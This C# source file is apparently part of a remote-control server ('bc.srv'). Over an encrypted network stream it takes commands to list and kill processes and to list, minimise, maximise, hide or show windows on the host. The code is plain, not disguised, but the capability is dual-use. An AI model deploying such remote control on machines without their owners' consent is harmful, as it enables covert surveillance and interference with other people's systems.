using System.Diagnostics;
using System.IO;
using System.Net.Sockets;
using System.Threading;
using bc.srv.Classes.Comunicator;

namespace bc.srv.Modules.System_Info
{
    internal class SystemAgent
    {
        private readonly MsgManager mm;

        private bool stopSystemListener;
        private readonly NetworkStream systemStream;

        public SystemAgent(NetworkStream clientStream)
        {
            this.systemStream = clientStream;
            this.mm = new MsgManager(clientStream);
        }

        /// <summary>
        ///     Avvia thread di ascolto per System Info
        /// </summary>
        public void StartSystemListener()
        {
            var t = new Thread(this.SystemListener);
            t.IsBackground = true;
            t.Start();
        }


        /// <summary>
        ///     Listener System Info
        /// </summary>
        private void SystemListener()
        {
            while (SrvData.Instance.isConnected && !this.stopSystemListener)
                try
                {
                    Thread.Sleep(10);

                    var cmd = this.mm.WaitForEncryMessageRicorsive(10000);

                    if (this.stopSystemListener)
                        break;

                    if (cmd != "TIMEOUT" && cmd != "__ERROR__")
                    {
                        var cmdSplit = cmd.Split('|');

                        switch (cmdSplit[0])
                        {
                            case "LIST_PROCESSES":
                                // INVIA LISTA DEI PROCESSI ATTIVI
                                this.SendProcesses();
                                break;

                            case "KILL":
                                // KILLO IL PROCESSO INDICATO ON CMDSPLIT1
                                this.KillProcess(cmdSplit[1]);
                                break;

                            case "EXIT":
                                // ESCO DAL CICLO E VIENE UCCISO IL THREAD E LISTENER
                                this.stopSystemListener = true;
                                break;

                            case "LIST_WINDOWS":
                                // INVIA LISTA DELLE finestre
                                this.SendWindows();
                                break;

                            case "MINIMIZE_WINDOW":
                                // RICHIESTA Minimize FINESTRA CON HANDLE PASSATO IN CMDPAR1
                                this.MinimizeWindow(cmdSplit[1]);
                                break;

                            case "MAXIMIZE_WINDOW":
                                // RICHIESTA Maximize FINESTRA CON HANDLE PASSATO IN CMDPAR1
                                this.MaximizeWindow(cmdSplit[1]);
                                break;

                            case "HIDE_WINDOW":
                                // RICHIESTA Hide FINESTRA CON HANDLE PASSATO IN CMDPAR1
                                this.HideWindow(cmdSplit[1]);
                                break;

                            case "SHOW_WINDOW":
                                // RICHIESTA Show FINESTRA CON HANDLE PASSATO IN CMDPAR1
                                this.ShowWindow(cmdSplit[1]);
                                break;
                        }
                    }
                }
                catch
                {
                }

            // ARRIVO QUI PERCHè IL LISTENER è MORTO

            if (SrvData.Instance.nsListaCanali.Contains(this.systemStream))
                SrvData.Instance.nsListaCanali.Remove(this.systemStream);


            try
            {
                this.systemStream.Close();
            }
            catch
            {
            }
        }


        /// <summary>
        ///     Invia i Processi
        ///     La * divide i processi
        ///     La | divide le proprietà dei processi
        /// </summary>
        private void SendProcesses()
        {
            try
            {
                var activeProcess = Process.GetProcesses();

                var processListMessage = "";

                foreach (var process in activeProcess)
                {
                    // NOME DEL PROCESSO
                    var procName = "";
                    var procDescription = "";
                    var procLocation = "";

                    try
                    {
                        procLocation = process.Modules[0].FileName;

                        if (procLocation != "")
                        {
                            procName = Path.GetFileName(procLocation);
                            procDescription = process.Modules[0].FileVersionInfo.FileDescription;
                        }
                    }
                    catch
                    {
                        procName = process.ProcessName;
                        procLocation = "";
                        procDescription = "";
                    }
                    //----------------------                    


                    var procId = process.Id.ToString();
                    var procThradsNumb = process.Threads.Count.ToString();

                    var procListEntry = string.Format("{0}|{1}|{2}|{3}|{4}", procName, procId, procThradsNumb,
                        procLocation, procDescription);
                    processListMessage += procListEntry + "*";
                }

                processListMessage = processListMessage.TrimEnd('*');

                this.mm.SendLargeEncryMessage(processListMessage, 10000);
            }
            catch
            {
            }
        }
        //--------------------------------


        /// <summary>
        ///     Termina il processo indicato dall'ID
        /// </summary>
        /// <param name="procId"></param>
        private void KillProcess(string procId)
        {
            try
            {
                var iId = int.Parse(procId);

                var p = Process.GetProcessById(iId);

                if (p != null)
                    p.Kill();

                this.mm.SendEncryMessage("KILLED!", 5000);
            }
            catch
            {
                this.mm.SendEncryMessage("NOT_KILLED!", 5000);
            }
        }
        //--------------------------------

        /// <summary>
        ///     Invia le finestre
        /// </summary>
        private void SendWindows()
        {
            try
            {
                var wm = new WindowsManager();
                var winList = wm.GetWindows();

                if (winList != null)
                    this.mm.SendLargeEncryMessage(winList, 10000);
            }
            catch
            {
            }
        }


        /// <summary>
        ///     Minimize una finestra
        ///     Risponde l'esito dell'operazione
        /// </summary>
        /// <param name="sHandle"></param>
        private void MinimizeWindow(string sHandle)
        {
            try
            {
                var iHandle = int.Parse(sHandle);
                var wm = new WindowsManager();

                var minimize = wm.MinimizeWindow(iHandle);

                if (minimize > 0)
                    this.mm.SendEncryMessage("MINIZED", 5000);
                else
                    this.mm.SendEncryMessage("NOT_MINIMIZED", 5000);
            }
            catch
            {
                this.mm.SendEncryMessage("NOT_CLOSED", 5000);
            }
        }

        /// <summary>
        ///     Massimizza una finestra
        ///     Risponde l'esito dell'operazione
        /// </summary>
        /// <param name="sHandle"></param>
        private void MaximizeWindow(string sHandle)
        {
            try
            {
                var iHandle = int.Parse(sHandle);
                var wm = new WindowsManager();

                var minimize = wm.MaximizeWindow(iHandle);

                if (minimize > 0)
                    this.mm.SendEncryMessage("OK", 5000);
                else
                    this.mm.SendEncryMessage("NOT", 5000);
            }
            catch
            {
                this.mm.SendEncryMessage("ERROR", 5000);
            }
        }

        /// <summary>
        ///     hIDE una finestra
        ///     Risponde l'esito dell'operazione
        /// </summary>
        /// <param name="sHandle"></param>
        private void HideWindow(string sHandle)
        {
            try
            {
                var iHandle = int.Parse(sHandle);
                var wm = new WindowsManager();

                var h = wm.HideWindow(iHandle);

                if (h > 0)
                    this.mm.SendEncryMessage("OK", 5000);
                else
                    this.mm.SendEncryMessage("NOT", 5000);
            }
            catch
            {
                this.mm.SendEncryMessage("ERROR", 5000);
            }
        }

        /// <summary>
        ///     Show una finestra
        ///     Risponde l'esito dell'operazione
        /// </summary>
        /// <param name="sHandle"></param>
        private void ShowWindow(string sHandle)
        {
            try
            {
                var iHandle = int.Parse(sHandle);
                var wm = new WindowsManager();

                var h = wm.ShowWindow(iHandle);

                if (h > 0)
                    this.mm.SendEncryMessage("OK", 5000);
                else
                    this.mm.SendEncryMessage("NOT", 5000);
            }
            catch
            {
                this.mm.SendEncryMessage("ERROR", 5000);
            }
        }
    }
}